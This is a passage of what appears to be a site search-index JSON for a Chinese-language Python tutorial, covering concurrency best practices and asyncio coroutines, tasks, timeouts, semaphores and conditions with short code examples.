\u4f7f\u7528\u8c03\u8bd5\u5de5\u5177","text":"<p>\u4f7f\u7528\u4e13\u7528\u7684\u8c03\u8bd5\u5de5\u5177\u5206\u6790\u5e76\u53d1\u95ee\u9898\uff1a</p> <pre><code># \u4f7f\u7528threading\u6a21\u5757\u7684\u8c03\u8bd5\u529f\u80fd\nimport threading\nt\nthreading._debug = True  # \u542f\u7528\u7ebf\u7a0b\u8c03\u8bd5\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#3_4","title":"3. \u91cd\u73b0\u95ee\u9898","text":"<p>\u7b80\u5316\u5e76\u53d1\u4ee3\u7801\uff0c\u521b\u5efa\u6700\u5c0f\u53ef\u91cd\u73b0\u7684\u6d4b\u8bd5\u7528\u4f8b\uff1a</p> <pre><code># \u6700\u5c0f\u53ef\u91cd\u73b0\u7684\u6b7b\u9501\u6d4b\u8bd5\u7528\u4f8b\nimport threading\n\nlock1 = threading.Lock()\nlock2 = threading.Lock()\n\ndef thread1():\n    lock1.acquire()\n    print(\"Thread 1 acquired lock1\")\n    threading.Event().wait(1)  # \u6545\u610f\u5ef6\u8fdf\uff0c\u589e\u52a0\u6b7b\u9501\u53ef\u80fd\u6027\n    lock2.acquire()\n    print(\"Thread 1 acquired lock2\")\n    lock2.release()\n    lock1.release()\n\ndef thread2():\n    lock2.acquire()\n    print(\"Thread 2 acquired lock2\")\n    threading.Event().wait(1)  # \u6545\u610f\u5ef6\u8fdf\uff0c\u589e\u52a0\u6b7b\u9501\u53ef\u80fd\u6027\n    lock1.acquire()\n    print(\"Thread 2 acquired lock1\")\n    lock1.release()\n    lock2.release()\n\n# \u521b\u5efa\u5e76\u542f\u52a8\u7ebf\u7a0b\nt1 = threading.Thread(target=thread1)\nt2 = threading.Thread(target=thread2)\nt1.start()\nt2.start()\nt1.join()\nt2.join()\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#_8","title":"\u5b9e\u9645\u5e94\u7528\u793a\u4f8b","text":""},{"location":"python-advanced/concurrency-best-practices/#1-web","title":"1. \u5f02\u6b65Web\u722c\u866b","text":"<pre><code>import asyncio\nimport aiohttp\nimport time\n\nasync def fetch_url(session, url):\n    async with session.get(url) as response:\n        return await response.text()\n\nasync def main():\n    urls = [\n        'https://httpbin.org/get',\n        'https://httpbin.org/delay/1',\n        'https://httpbin.org/delay/2',\n        # ... \u66f4\u591aURL ...\n    ]\n\n    async with aiohttp.ClientSession() as session:\n        tasks = [fetch_url(session, url) for url in urls]\n        # \u9650\u5236\u5e76\u53d1\u6570\u4e3a5\n        semaphore = asyncio.Semaphore(5)\n\n        async def bounded_fetch(url):\n            async with semaphore:\n                return await fetch_url(session, url)\n\n        tasks = [bounded_fetch(url) for url in urls]\n        results = await asyncio.gather(*tasks)\n\n        print(f\"Fetched {len(results)} URLs\")\n\nstart_time = time.time()\nasyncio.run(main())\nprint(f\"Total time: {time.time() - start_time:.2f} seconds\")\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#2_5","title":"2. \u591a\u7ebf\u7a0b\u6570\u636e\u5904\u7406\u7ba1\u9053","text":"<pre><code>import threading\nimport queue\nimport time\n\ndef producer(q, data):\n    for item in data:\n        q.put(item)\n        print(f\"Produced: {item}\")\n        time.sleep(0.1)\n    q.put(None)  # \u53d1\u9001\u7ed3\u675f\u4fe1\u53f7\n\ndef processor(in_q, out_q):\n    while True:\n        item = in_q.get()\n        if item is None:  # \u6536\u5230\u7ed3\u675f\u4fe1\u53f7\n            out_q.put(None)  # \u4f20\u9012\u7ed3\u675f\u4fe1\u53f7\n            break\n        # \u5904\u7406\u6570\u636e\n        processed = item * 2\n        out_q.put(processed)\n        print(f\"Processed: {item} -&gt; {processed}\")\n        in_q.task_done()\n\ndef consumer(q):\n    results = []\n    while True:\n        item = q.get()\n        if item is None:  # \u6536\u5230\u7ed3\u675f\u4fe1\u53f7\n            break\n        results.append(item)\n        print(f\"Consumed: {item}\")\n        q.task_done()\n    return results\n\n# \u521b\u5efa\u961f\u5217\ninput_queue = queue.Queue()\noutput_queue = queue.Queue()\n\n# \u521b\u5efa\u7ebf\u7a0b\nproducer_thread = threading.Thread(target=producer, args=(input_queue, range(10)))\nprocessor_thread = threading.Thread(target=processor, args=(input_queue, output_queue))\nconsumer_thread = threading.Thread(target=consumer, args=(output_queue,))\n\n# \u542f\u52a8\u7ebf\u7a0b\nproducer_thread.start()\nprocessor_thread.start()\nconsumer_thread.start()\n\n# \u7b49\u5f85\u7ebf\u7a0b\u5b8c\u6210\nproducer_thread.join()\nprocessor_thread.join()\nconsumer_thread.join()\n\nprint(\"Pipeline completed\")\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#_9","title":"\u603b\u7ed3","text":"<p>Python\u5e76\u53d1\u7f16\u7a0b\u53ef\u4ee5\u663e\u8457\u63d0\u9ad8\u7a0b\u5e8f\u7684\u6027\u80fd\u548c\u54cd\u5e94\u6027\uff0c\u4f46\u9700\u8981\u8c28\u614e\u5904\u7406\u5e76\u53d1\u5b89\u5168\u95ee\u9898\u3002\u9009\u62e9\u5408\u9002\u7684\u5e76\u53d1\u6a21\u578b\uff0c\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\uff0c\u4f7f\u7528\u6b63\u786e\u7684\u5de5\u5177\u548c\u6a21\u5f0f\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u907f\u514d\u5e38\u89c1\u7684\u5e76\u53d1\u9677\u9631\uff0c\u7f16\u5199\u51fa\u9ad8\u6548\u3001\u53ef\u9760\u7684\u5e76\u53d1\u4ee3\u7801\u3002\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u5e94\u5f53\u6839\u636e\u4efb\u52a1\u7684\u6027\u8d28\u3001\u7cfb\u7edf\u8d44\u6e90\u548c\u6027\u80fd\u9700\u6c42\uff0c\u9009\u62e9\u6700\u9002\u5408\u7684\u5e76\u53d1\u7f16\u7a0b\u65b9\u5f0f\uff0c\u5e76\u8fdb\u884c\u5145\u5206\u7684\u6d4b\u8bd5\u548c\u8c03\u8bd5\u3002</p>"},{"location":"python-advanced/coroutines/","title":"Python\u534f\u7a0b\u4e0e\u5f02\u6b65\u7f16\u7a0b","text":""},{"location":"python-advanced/coroutines/#_1","title":"\u4ec0\u4e48\u662f\u5f02\u6b65\u7f16\u7a0b\uff1f","text":"<p>\u5f02\u6b65\u7f16\u7a0b\u662f\u4e00\u79cd\u5e76\u53d1\u7f16\u7a0b\u8303\u5f0f\uff0c\u5b83\u5141\u8bb8\u7a0b\u5e8f\u5728\u7b49\u5f85\u67d0\u4e2a\u64cd\u4f5c\uff08\u5982I/O\u64cd\u4f5c\uff09\u5b8c\u6210\u65f6\u6267\u884c\u5176\u4ed6\u4efb\u52a1\uff0c\u800c\u4e0d\u662f\u88ab\u963b\u585e\u3002\u5728\u4f20\u7edf\u7684\u540c\u6b65\u7f16\u7a0b\u4e2d\uff0c\u5f53\u7a0b\u5e8f\u6267\u884cI/O\u64cd\u4f5c\u65f6\uff0c\u7ebf\u7a0b\u4f1a\u88ab\u963b\u585e\uff0c\u76f4\u5230\u64cd\u4f5c\u5b8c\u6210\u624d\u80fd\u7ee7\u7eed\u6267\u884c\u3002\u800c\u5f02\u6b65\u7f16\u7a0b\u53ef\u4ee5\u5728\u7b49\u5f85I/O\u64cd\u4f5c\u7684\u540c\u65f6\u7ee7\u7eed\u6267\u884c\u5176\u4ed6\u4ee3\u7801\uff0c\u4ece\u800c\u63d0\u9ad8\u7a0b\u5e8f\u7684\u6548\u7387\u548c\u54cd\u5e94\u6027\u3002</p> <p>Python\u4ece3.4\u7248\u672c\u5f00\u59cb\u5f15\u5165\u4e86<code>asyncio</code>\u5e93\uff0c\u4ece3.5\u7248\u672c\u5f00\u59cb\u63d0\u4f9b\u4e86<code>async/await</code>\u8bed\u6cd5\u7cd6\uff0c\u4f7f\u5f97\u5f02\u6b65\u7f16\u7a0b\u53d8\u5f97\u66f4\u52a0\u7b80\u5355\u548c\u76f4\u89c2\u3002</p>"},{"location":"python-advanced/coroutines/#_2","title":"\u534f\u7a0b\u7684\u57fa\u672c\u6982\u5ff5","text":""},{"location":"python-advanced/coroutines/#_3","title":"\u534f\u7a0b\u662f\u4ec0\u4e48\uff1f","text":"<p>\u534f\u7a0b\uff08Coroutine\uff09\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u51fd\u6570\uff0c\u5b83\u53ef\u4ee5\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u6682\u505c\uff0c\u5e76\u5728\u7a0d\u540e\u6062\u590d\u6267\u884c\u3002\u4e0e\u7ebf\u7a0b\u4e0d\u540c\uff0c\u534f\u7a0b\u7684\u5207\u6362\u7531\u7a0b\u5e8f\u81ea\u8eab\u63a7\u5236\uff0c\u800c\u4e0d\u662f\u7531\u64cd\u4f5c\u7cfb\u7edf\u8c03\u5ea6\u3002\u8fd9\u4f7f\u5f97\u534f\u7a0b\u6bd4\u7ebf\u7a0b\u66f4\u52a0\u8f7b\u91cf\u7ea7\uff0c\u5207\u6362\u5f00\u9500\u66f4\u5c0f\u3002</p> <p>\u5728Python\u4e2d\uff0c\u534f\u7a0b\u662f\u901a\u8fc7<code>async def</code>\u5b9a\u4e49\u7684\u51fd\u6570\uff1a</p> <pre><code>async def coroutine_function():\n    print(\"Coroutine started\")\n    await asyncio.sleep(1)  # \u6682\u505c\u6267\u884c1\u79d2\n    print(\"Coroutine resumed\")\n    return \"Coroutine result\"\n</code></pre>"},{"location":"python-advanced/coroutines/#_4","title":"\u534f\u7a0b\u4e0e\u751f\u6210\u5668\u7684\u5173\u7cfb","text":"<p>\u65e9\u671f\u7248\u672c\u7684Python\u4e2d\uff0c\u534f\u7a0b\u662f\u901a\u8fc7\u751f\u6210\u5668\u5b9e\u73b0\u7684\u3002Python 3.5\u5f15\u5165\u7684<code>async/await</code>\u8bed\u6cd5\u4f7f\u534f\u7a0b\u6210\u4e3a\u4e86\u72ec\u7acb\u7684\u6982\u5ff5\uff0c\u4f46\u534f\u7a0b\u4ecd\u7136\u4e0e\u751f\u6210\u5668\u6709\u4e00\u5b9a\u7684\u76f8\u4f3c\u4e4b\u5904\u3002</p>"},{"location":"python-advanced/coroutines/#asyncio","title":"asyncio\u5e93\u4ecb\u7ecd","text":"<p><code>asyncio</code>\u662fPython\u7684\u6807\u51c6\u5e93\uff0c\u7528\u4e8e\u7f16\u5199\u5355\u7ebf\u7a0b\u7684\u5e76\u53d1\u4ee3\u7801\uff0c\u4f7f\u7528<code>async/await</code>\u8bed\u6cd5\u3002\u5b83\u63d0\u4f9b\u4e86\u4e8b\u4ef6\u5faa\u73af\u3001\u534f\u7a0b\u3001\u4efb\u52a1\u3001\u672a\u6765\u7b49\u7ec4\u4ef6\uff0c\u7528\u4e8e\u5b9e\u73b0\u5f02\u6b65I/O\u64cd\u4f5c\u3002</p>"},{"location":"python-advanced/coroutines/#_5","title":"\u4e8b\u4ef6\u5faa\u73af","text":"<p>\u4e8b\u4ef6\u5faa\u73af\u662fasyncio\u7684\u6838\u5fc3\uff0c\u5b83\u8d1f\u8d23\u8c03\u5ea6\u548c\u6267\u884c\u534f\u7a0b\u3002\u4e8b\u4ef6\u5faa\u73af\u53ef\u4ee5\u6ce8\u518c\u4efb\u52a1\uff0c\u6267\u884c\u5f02\u6b65\u64cd\u4f5c\uff0c\u5e76\u5904\u7406\u5b8c\u6210\u7684\u64cd\u4f5c\u3002</p> <pre><code>import asyncio\n\nasync def main():\n    print(\"Hello\")\n    await asyncio.sleep(1)\n    print(\"World\")\n\n# \u83b7\u53d6\u4e8b\u4ef6\u5faa\u73af\nloop = asyncio.get_event_loop()\n# \u8fd0\u884c\u534f\u7a0b\nloop.run_until_complete(main())\n# \u5173\u95ed\u4e8b\u4ef6\u5faa\u73af\nloop.close()\n\n# \u5728Python 3.7+\u4e2d\uff0c\u53ef\u4ee5\u7b80\u5316\u4e3a\n# asyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_6","title":"\u521b\u5efa\u548c\u8fd0\u884c\u534f\u7a0b","text":""},{"location":"python-advanced/coroutines/#_7","title":"\u5b9a\u4e49\u534f\u7a0b","text":"<p>\u4f7f\u7528<code>async def</code>\u5173\u952e\u5b57\u5b9a\u4e49\u534f\u7a0b\uff1a</p> <pre><code>async def simple_coroutine():\n    print(\"Inside the coroutine\")\n    return \"Coroutine result\"\n</code></pre>"},{"location":"python-advanced/coroutines/#_8","title":"\u8fd0\u884c\u534f\u7a0b","text":"<p>\u534f\u7a0b\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u9700\u8981\u901a\u8fc7\u4e8b\u4ef6\u5faa\u73af\u6765\u8fd0\u884c\uff1a</p> <pre><code>import asyncio\n\nasync def simple_coroutine():\n    print(\"Inside the coroutine\")\n    return \"Coroutine result\"\n\n# \u65b9\u6cd51\uff1a\u4f7f\u7528asyncio.run()\uff08Python 3.7+\uff09\nasync def main():\n    result = await simple_coroutine()\n    print(f\"Result: {result}\")\n\nasyncio.run(main())\n\n# \u65b9\u6cd52\uff1a\u4f7f\u7528\u4e8b\u4ef6\u5faa\u73af\n# coro = simple_coroutine()\n# loop = asyncio.get_event_loop()\n# result = loop.run_until_complete(coro)\n# print(f\"Result: {result}\")\n# loop.close()\n</code></pre>"},{"location":"python-advanced/coroutines/#await","title":"await\u8868\u8fbe\u5f0f","text":"<p><code>await</code>\u8868\u8fbe\u5f0f\u7528\u4e8e\u7b49\u5f85\u534f\u7a0b\u3001\u4efb\u52a1\u6216\u5176\u4ed6\u53ef\u7b49\u5f85\u5bf9\u8c61\u7684\u5b8c\u6210\uff1a</p> <pre><code>import asyncio\n\nasync def nested_coroutine():\n    print(\"Nested coroutine\")\n    await asyncio.sleep(1)\n    return \"Nested result\"\n\nasync def main():\n    print(\"Main started\")\n    # \u7b49\u5f85\u5d4c\u5957\u534f\u7a0b\u5b8c\u6210\n    result = await nested_coroutine()\n    print(f\"Got result: {result}\")\n    print(\"Main finished\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#tasks","title":"\u4efb\u52a1\uff08Tasks\uff09","text":"<p>\u4efb\u52a1\u662f\u88ab\u8c03\u5ea6\u6267\u884c\u7684\u534f\u7a0b\u3002\u4f7f\u7528<code>asyncio.create_task()</code>\u53ef\u4ee5\u5c06\u534f\u7a0b\u5305\u88c5\u6210\u4efb\u52a1\uff1a</p> <pre><code>import asyncio\n\nasync def foo():\n    print(\"Foo started\")\n    await asyncio.sleep(2)\n    print(\"Foo finished\")\n    return \"Foo result\"\n\nasync def bar():\n    print(\"Bar started\")\n    await asyncio.sleep(1)\n    print(\"Bar finished\")\n    return \"Bar result\"\n\nasync def main():\n    # \u521b\u5efa\u4efb\u52a1\n    task1 = asyncio.create_task(foo())\n    task2 = asyncio.create_task(bar())\n\n    print(\"Tasks created\")\n\n    # \u7b49\u5f85\u4efb\u52a1\u5b8c\u6210\n    result1 = await task1\n    result2 = await task2\n\n    print(f\"Results: {result1}, {result2}\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_9","title":"\u5e76\u53d1\u8fd0\u884c\u4efb\u52a1","text":""},{"location":"python-advanced/coroutines/#asynciogather","title":"\u4f7f\u7528asyncio.gather()","text":"<p><code>asyncio.gather()</code>\u53ef\u4ee5\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u534f\u7a0b\u6216\u4efb\u52a1\uff0c\u5e76\u6536\u96c6\u5b83\u4eec\u7684\u7ed3\u679c\uff1a</p> <pre><code>import asyncio\nimport time\n\nasync def worker(name, delay):\n    print(f\"Worker {name} started\")\n    await asyncio.sleep(delay)\n    print(f\"Worker {name} finished\")\n    return f\"Result from {name}\"\n\nasync def main():\n    start_time = time.time()\n\n    # \u5e76\u53d1\u8fd0\u884c\u591a\u4e2a\u4efb\u52a1\n    results = await asyncio.gather(\n        worker(\"A\", 2),\n        worker(\"B\", 1),\n        worker(\"C\", 3)\n    )\n\n    end_time = time.time()\n    print(f\"All workers completed in {end_time - start_time:.2f} seconds\")\n    print(f\"Results: {results}\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#asynciowait","title":"\u4f7f\u7528asyncio.wait()","text":"<p><code>asyncio.wait()</code>\u53ef\u4ee5\u7b49\u5f85\u4e00\u7ec4\u4efb\u52a1\u5b8c\u6210\uff0c\u5e76\u8fd4\u56de\u5df2\u5b8c\u6210\u548c\u5f85\u5b8c\u6210\u7684\u4efb\u52a1\uff1a</p> <pre><code>import asyncio\n\nasync def worker(name, delay):\n    print(f\"Worker {name} started\")\n    await asyncio.sleep(delay)\n    print(f\"Worker {name} finished\")\n    return f\"Result from {name}\"\n\nasync def main():\n    # \u521b\u5efa\u4efb\u52a1\u5217\u8868\n    tasks = [\n        asyncio.create_task(worker(\"A\", 2)),\n        asyncio.create_task(worker(\"B\", 1)),\n        asyncio.create_task(worker(\"C\", 3))\n    ]\n\n    # \u7b49\u5f85\u4efb\u52a1\u5b8c\u6210\uff0c\u8fd4\u56de\u5df2\u5b8c\u6210\u548c\u5f85\u5b8c\u6210\u7684\u4efb\u52a1\n    done, pending = await asyncio.wait(tasks)\n\n    # \u5904\u7406\u5df2\u5b8c\u6210\u7684\u4efb\u52a1\n    for task in done:\n        try:\n            result = task.result()\n            print(f\"Got result: {result}\")\n        except Exception as e:\n            print(f\"Task exception: {e}\")\n\n    # \u53d6\u6d88\u5f85\u5b8c\u6210\u7684\u4efb\u52a1\n    for task in pending:\n        task.cancel()\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#io","title":"\u5f02\u6b65I/O\u64cd\u4f5c","text":""},{"location":"python-advanced/coroutines/#_10","title":"\u5f02\u6b65\u6587\u4ef6\u64cd\u4f5c","text":"<p>Python 3.7+\u63d0\u4f9b\u4e86<code>aiofiles</code>\u5e93\uff0c\u53ef\u4ee5\u8fdb\u884c\u5f02\u6b65\u6587\u4ef6\u64cd\u4f5c\uff1a</p> <pre><code># \u5148\u5b89\u88c5aiofiles: pip install aiofiles\nimport asyncio\nimport aiofiles\n\nasync def write_to_file(filename, content):\n    async with aiofiles.open(filename, 'w') as f:\n        await f.write(content)\n    print(f\"Written to {filename}\")\n\nasync def read_from_file(filename):\n    async with aiofiles.open(filename, 'r') as f:\n        content = await f.read()\n    print(f\"Read from {filename}: {content[:50]}...\")\n    return content\n\nasync def main():\n    # \u5f02\u6b65\u5199\u5165\u6587\u4ef6\n    await write_to_file('example.txt', 'This is an example content for async file operations.')\n\n    # \u5f02\u6b65\u8bfb\u53d6\u6587\u4ef6\n    content = await read_from_file('example.txt')\n    print(f\"Full content length: {len(content)}\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_11","title":"\u5f02\u6b65\u7f51\u7edc\u8bf7\u6c42","text":"<p>\u4f7f\u7528<code>aiohttp</code>\u5e93\u53ef\u4ee5\u8fdb\u884c\u5f02\u6b65HTTP\u8bf7\u6c42\uff1a</p> <pre><code># \u5148\u5b89\u88c5aiohttp: pip install aiohttp\nimport asyncio\nimport aiohttp\n\nasync def fetch(session, url):\n    async with session.get(url) as response:\n        return await response.text()\n\nasync def main():\n    urls = [\n        'https://httpbin.org/get',\n        'https://httpbin.org/delay/1',\n        'https://httpbin.org/delay/2'\n    ]\n\n    async with aiohttp.ClientSession() as session:\n        # \u5e76\u53d1\u83b7\u53d6\u591a\u4e2aURL\n        tasks = [fetch(session, url) for url in urls]\n        results = await asyncio.gather(*tasks)\n\n        for i, result in enumerate(results):\n            print(f\"URL {i+1} content length: {len(result)}\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_12","title":"\u5f02\u6b65\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668","text":"<p>\u5f02\u6b65\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u5141\u8bb8\u5728\u5f02\u6b65\u4ee3\u7801\u4e2d\u4f7f\u7528<code>async with</code>\u8bed\u53e5\uff1a</p> <pre><code>import asyncio\n\nclass AsyncContextManager:\n    async def __aenter__(self):\n        print(\"Entering context\")\n        await asyncio.sleep(1)\n        return \"Context value\"\n\n    async def __aexit__(self, exc_type, exc_val, exc_tb):\n        print(\"Exiting context\")\n        await asyncio.sleep(1)\n\nasync def main():\n    async with AsyncContextManager() as value:\n        print(f\"Inside context, got value: {value}\")\n        await asyncio.sleep(1)\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_13","title":"\u5f02\u6b65\u8fed\u4ee3\u5668","text":"<p>\u5f02\u6b65\u8fed\u4ee3\u5668\u5141\u8bb8\u5728\u5f02\u6b65\u4ee3\u7801\u4e2d\u4f7f\u7528<code>async for</code>\u8bed\u53e5\uff1a</p> <pre><code>import asyncio\n\nclass AsyncIterator:\n    def __init__(self, start, end):\n        self.start = start\n        self.end = end\n\n    def __aiter__(self):\n        self.current = self.start\n        return self\n\n    async def __anext__(self):\n        if self.current &gt;= self.end:\n            raise StopAsyncIteration\n\n        value = self.current\n        self.current += 1\n        await asyncio.sleep(0.5)  # \u6a21\u62df\u5f02\u6b65\u64cd\u4f5c\n        return value\n\nasync def main():\n    async for i in AsyncIterator(1, 6):\n        print(f\"Got: {i}\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_14","title":"\u534f\u7a0b\u7684\u9ad8\u7ea7\u7528\u6cd5","text":""},{"location":"python-advanced/coroutines/#_15","title":"\u53d6\u6d88\u4efb\u52a1","text":"<p>\u4efb\u52a1\u53ef\u4ee5\u88ab\u53d6\u6d88\uff0c\u53d6\u6d88\u540e\u4f1a\u629b\u51fa<code>CancelledError</code>\u5f02\u5e38\uff1a</p> <pre><code>import asyncio\n\nasync def worker():\n    try:\n        print(\"Worker started\")\n        await asyncio.sleep(10)  # \u6a21\u62df\u957f\u65f6\u95f4\u8fd0\u884c\u7684\u4efb\u52a1\n        print(\"Worker finished\")\n    except asyncio.CancelledError:\n        print(\"Worker was cancelled\")\n        raise  # \u53ef\u4ee5\u9009\u62e9\u91cd\u65b0\u629b\u51fa\u5f02\u5e38\n    finally:\n        print(\"Worker cleanup\")\n\nasync def main():\n    task = asyncio.create_task(worker())\n\n    # \u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4\u540e\u53d6\u6d88\u4efb\u52a1\n    await asyncio.sleep(2)\n    print(\"Cancelling task\")\n    task.cancel()\n\n    try:\n        # \u7b49\u5f85\u4efb\u52a1\u5b8c\u6210\uff08\u5305\u62ec\u5904\u7406\u53d6\u6d88\uff09\n        await task\n    except asyncio.CancelledError:\n        print(\"Main caught CancelledError\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_16","title":"\u8d85\u65f6\u5904\u7406","text":"<p>\u4f7f\u7528<code>asyncio.wait_for()</code>\u53ef\u4ee5\u4e3a\u534f\u7a0b\u8bbe\u7f6e\u8d85\u65f6\uff1a</p> <pre><code>import asyncio\n\nasync def slow_operation():\n    print(\"Starting slow operation\")\n    await asyncio.sleep(5)  # \u6a21\u62df\u8017\u65f6\u64cd\u4f5c\n    print(\"Slow operation completed\")\n    return \"Result\"\n\nasync def main():\n    try:\n        # \u8bbe\u7f6e3\u79d2\u8d85\u65f6\n        result = await asyncio.wait_for(slow_operation(), timeout=3)\n        print(f\"Got result: {result}\")\n    except asyncio.TimeoutError:\n        print(\"Operation timed out\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_17","title":"\u4fe1\u53f7\u91cf","text":"<p><code>asyncio.Semaphore</code>\u7528\u4e8e\u9650\u5236\u5e76\u53d1\u8bbf\u95ee\u8d44\u6e90\u7684\u6570\u91cf\uff1a</p> <pre><code>import asyncio\n\nasync def worker(name, semaphore):\n    print(f\"Worker {name} waiting for semaphore\")\n    async with semaphore:\n        print(f\"Worker {name} acquired semaphore\")\n        await asyncio.sleep(2)  # \u6a21\u62df\u5de5\u4f5c\n        print(f\"Worker {name} releasing semaphore\")\n\nasync def main():\n    # \u521b\u5efa\u4fe1\u53f7\u91cf\uff0c\u6700\u591a\u5141\u8bb82\u4e2a\u5e76\u53d1\u8bbf\u95ee\n    semaphore = asyncio.Semaphore(2)\n\n    # \u521b\u5efa\u591a\u4e2a\u4efb\u52a1\n    tasks = [worker(i, semaphore) for i in range(5)]\n    await asyncio.gather(*tasks)\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_18","title":"\u6761\u4ef6\u53d8\u91cf","text":"<p><code>asyncio.Condition</code>\u7528\u4e8e\u7ebf\u7a0b\u95f4\u7684\u590d\u6742\u540c\u6b65\uff1a</p> <pre><code>import asyncio\n\nasync def waiter(condition, name):\n    print(f\"Waiter {name} waiting\")\n    async with condition:\n        await condition.wait()  # \u7b49\u5f85\u901a\u77e5\n        print(f\"Waiter {name} got notified\")\n\nasync def notifier(condition):\n    await asyncio.sleep(2)  # \u5ef6\u8fdf\u901a\u77e5\n    print(\"Notifier is about to notify\")\n    async with condition:\n        condition.notify_all()  # \u901a\u77e5\u6240\u6709\u7b49\u5f85\u7684\u534f\u7a0b\n    print(\"Notifier has notified\")\n\nasync def main():\n    condition = asyncio.Condition()\n\n    # \u521b\u5efa\u7b49\u5f85\u8005\u548c\u901a\u77e5\u8005\u4efb\u52a1\n    waiter_tasks = [waiter(condition, i) for i in range(3)]\n    notifier_task = notifier(condition)\n\n    # \u5e76\u53d1\u8fd0\u884c\u6240\u6709\u4efb\u52a1\n    await asyncio.gather(*waiter_tasks, notifier_task)\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_19","title":"\u5f02\u6b65\u7f16\u7a0b\u7684\u6700\u4f73\u5b9e\u8df5","text":"<ol> <li>\u4f7f\u7528async/await\u8bed\u6cd5\uff1a\u4fdd\u6301\u4ee3\u7801\u6e05\u6670\u6613\u8bfb</li> <li>\u907f\u514d\u963b\u585e\u64cd\u4f5c\uff1a\u5728\u534f\u7a0b\u4e2d\u4f7f\u7528\u5f02\u6b65\u7248\u672c\u7684I/O\u64cd\u4f5c</li> <li>\u5408\u7406\u4f7f\u7528\u4efb\u52a1\uff1a\u4f7f\u7528<code>asyncio.create_task()</code>\u5e76\u53d1\u6267\u884c\u4efb\u52a1</li> <li>\u6ce8\u610f\u9519\u8bef\u5904\u7406\uff1a\u6355\u83b7\u5e76\u5904\u7406\u5f02\u6b65\u64cd\u4f5c\u4e2d\u53ef\u80fd\u51fa\u73b0\u7684\u5f02\u5e38</li> <li>\u4f7f\u7528\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff1a\u6b63\u786e\u7ba1\u7406\u8d44\u6e90\u7684\u83b7\u53d6\u548c\u91ca\u653e</li> <li>\u907f\u514d\u957f\u65f6\u95f4\u8fd0\u884c\u7684\u540c\u6b65\u4ee3\u7801\uff1a\u53ef\u80fd\u4f1a\u963b\u585e\u4e8b\u4ef6\u5faa\u73af</li> </ol> <pre><code>import asyncio\nimport time\n\ndef blocking_operation():\n    \"\"\"\u6a21\u62df\u963b\u585e\u64cd\u4f5c\"\"\"\n    print(\"Blocking operation started\")\n    time.sleep(2)  # \u963b\u585e\u64cd\u4f5c\n    print(\"Blocking operation completed\")\n    return \"Blocking result\"\n\nasync def non_blocking_operation():\n    \"\"\"\u4f7f\u7528\u7ebf\u7a0b\u6c60\u6267\u884c\u963b\u585e\u64cd\u4f5c\"\"\"\n    # \u83b7\u53d6\u7ebf\u7a0b\u6c60\u6267\u884c\u5668\n    loop = asyncio.get_event_loop()\n    # \u5728\u7ebf\u7a0b\u6c60\u4e2d\u6267\u884c\u963b\u585e\u64cd\u4f5c\n    result = await loop.run_in_executor(None, blocking_operation)\n    print(f\"Got result from blocking operation: {result}\")\n\nasync def main():\n    print(\"Main started\")\n\n    # \u5e76\u53d1\u8fd0\u884c\u975e\u963b\u585e\u64cd\u4f5c\u548c\u5176\u4ed6\u534f\u7a0b\n    await asyncio.gather(\n        non_blocking_operation(),\n        asyncio.sleep(1),  # \u5176\u4ed6\u5f02\u6b65\u64cd\u4f5c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\n        asyncio.sleep(1)\n    )\n\n    print(\"Main finished\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python-advanced/coroutines/#_20","title":"\u5f02\u6b65\u7f16\u7a0b\u4e0e\u591a\u7ebf\u7a0b\u7684\u533a\u522b","text":"\u7279\u6027 \u5f02\u6b65\u7f16\u7a0b \u591a\u7ebf\u7a0b\u7f16\u7a0b \u6267\u884c\u6a21\u578b \u5355\u7ebf\u7a0b\uff0c\u534f\u4f5c\u5f0f\u591a\u4efb\u52a1 \u591a\u7ebf\u7a0b\uff0c\u62a2\u5360\u5f0f\u591a\u4efb\u52a1 \u4e0a\u4e0b\u6587\u5207\u6362 \u7531\u7a0b\u5e8f\u63a7\u5236\uff0c\u5f00\u9500\u5c0f \u7531\u64cd\u4f5c\u7cfb\u7edf\u63a7\u5236\uff0c\u5f00\u9500\u5927 \u9501\u9700\u6c42 \u901a\u5e38\u4e0d\u9700\u8981\u9501 \u9700\u8981\u9501\u6765\u4fdd\u62a4\u5171\u4eab\u6570\u636e GIL\u5f71\u54cd \u65e0\u5f71\u54cd\uff08\u5355\u7ebf\u7a0b\uff09 CPU\u5bc6\u96c6\u578b\u4efb\u52a1\u53d7GIL\u9650\u5236 \u9002\u7528\u573a\u666f I/O\u5bc6\u96c6\u578b\u4efb\u52a1 I/O\u5bc6\u96c6\u578b\u548c\u90e8\u5206CPU\u5bc6\u96c6\u578b\u4efb\u52a1 \u7f16\u7a0b\u590d\u6742\u5ea6 